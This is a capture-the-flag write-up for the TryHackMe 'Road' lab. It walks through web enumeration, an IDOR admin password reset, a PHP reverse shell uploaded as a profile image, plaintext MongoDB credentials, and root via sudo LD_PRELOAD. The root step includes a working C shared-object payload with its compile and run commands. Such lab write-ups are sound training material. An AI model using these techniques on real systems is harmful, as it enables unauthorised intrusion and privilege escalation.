---
layout: posts
title: "Road CTF Writeup"
date: 2026-01-20
categories: writeups
tags: Linux 
description: Inspired by a real-world pentesting engagement
difficulty: Medium
---
# TryHackMe: WhyHackMe Writeup


**Difficulty:** {{page.difficulty}} | **Focus:** {{ page.tags | join: ', ' }}.

> **Room link:** [https://tryhackme.com/room/road](https://tryhackme.com/room/road)

Hello everyone! Today we are diving into **Road**, a TryHackMe room inspired by a real-world engagement. This box takes us through a classic web application vulnerability, a pivot through a NoSQL database, and a privilege escalation technique involving environment variables.
---

### Phase 1: Reconnaissance

We start by mapping the target to a local hostname to make the web navigation easier.
```
echo 'TARGET_IP road.thm' >> /etc/hosts
```

Next, a quick scan to see what ports are listening.
```
nmap -F -sV TARGET_IP
```
The scan reveals two open ports:
* **22/tcp**: SSH (OpenSSH 8.2p1)
* **80/tcp**: HTTP (Apache 2.4.41)

<div class="post-img"><img src="{{ site.baseurl }}/assets/img/road/1.png"></div>

We move on to directory brute-forcing to see what the web server is hiding.
```
gobuster dir -w /usr/share/wordlists/dirb/big.txt -u http://road.thm/ -x php,html -b 400-500
```
This uncovers a directory named `/v2` which seems to host a newer version of the application. Further enumeration of `/v2` shows:
* **v2/admin/**
* **v2/profile.php**
* **v2/lostpassword.php**


<div class="post-img"><img src="{{ site.baseurl }}/assets/img/road/2.png"></div>

---

### Phase 2: Vulnerability Analysis

The website belongs to **Sky Couriers**. Upon registering a standard account and exploring the dashboard, two main things stand out:
1.  **ResetUser.php**: This page allows users to change their password. If the backend doesn't verify that the user requesting the change owns the account, we might have an IDOR vulnerability.


2.  **profile.php**: There is a file upload field for a profile image, but the UI claims only "admins" can use it.

By checking the profile page, we find the admin's email: `admin@sky.thm`.

<div class="post-img"><img src="{{ site.baseurl }}/assets/img/road/3.png"></div>
---

### Phase 3: Exploitation (Foothold)

We can attempt to reset the admin's password by intercepting the request to `ResetUser.php` using Burp Suite. We change the username/email parameter to `admin@sky.thm` and submit our own new password. The server accepts it!


<div class="post-img"><img src="{{ site.baseurl }}/assets/img/road/4.png"></div>

With admin access, the profile image upload is now unlocked. We can use a standard PHP reverse shell.



**Steps to Shell:**
1.  Prepare a PHP reverse shell script.
2.  Upload it via the profile image update feature.
3.  **The Hunt for the File**: I initially looked in `/assets`, but the shell wasn't there—this was a bit of a rabbit hole. By inspecting the source code and logic of `profile.php`, I found a hidden directory: `/v2/profileimages/`.


<div class="post-img"><img src="{{ site.baseurl }}/assets/img/road/5.png"></div>

Trigger the shell by navigating to:
`http://road.thm/v2/profileimages/shell.php`

We now have a shell as `www-data`.


<div class="post-img"><img src="{{ site.baseurl }}/assets/img/road/6.png"></div>

---

### Phase 4: Escalation to User

After gaining a foothold, I began local enumeration. While `/var/www/html/v2/lostpassword.php` contained MySQL credentials, the database didn't have much besides the accounts we already knew.

However, checking active network connections revealed something interesting:
```
ss -tl
```
A MongoDB instance is running locally on port `27017`. 

<div class="post-img"><img src="{{ site.baseurl }}/assets/img/road/7.png"></div>


I explored the MongoDB databases and found one named `backup`. Inside the `user` collection, I struck gold: the plain-text password for the user `webdeveloper`.

<div class="post-img"><img src="{{ site.baseurl }}/assets/img/road/8.png"></div>

Switching to the user:
```
su webdeveloper
```
We can now grab the user flag from `/home/webdeveloper/user.txt`.

<div class="post-img"><img src="{{ site.baseurl }}/assets/img/road/9.png"></div>
---

### Phase 5: Escalation to Root

The final stretch involves checking sudo permissions for `webdeveloper`:
```
sudo -l
```
The output shows we can run `/usr/bin/sky_backup_utility` with NOPASSWD, and more importantly, the `env_keep+=LD_PRELOAD` option is enabled. This allows us to load a custom shared library before the binary executes.

<div class="post-img"><img src="{{ site.baseurl }}/assets/img/road/10.png"></div>

**The LD_PRELOAD Exploit:**

1.  **Create a C payload**: We write a simple script that sets the User ID to 0 (root) and spawns a shell.
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/sh");
}
```

2.  **Compile into a shared object**:
```
gcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles
```
This command compiles the C code into a shared library file that the system can load.

3.  **Execute**:
```
sudo LD_PRELOAD=/tmp/shell.so /usr/bin/sky_backup_utility
```


<div class="post-img"><img src="{{ site.baseurl }}/assets/img/road/11.png"></div>

We are root. You can now find the final flag in `/root/root.txt`.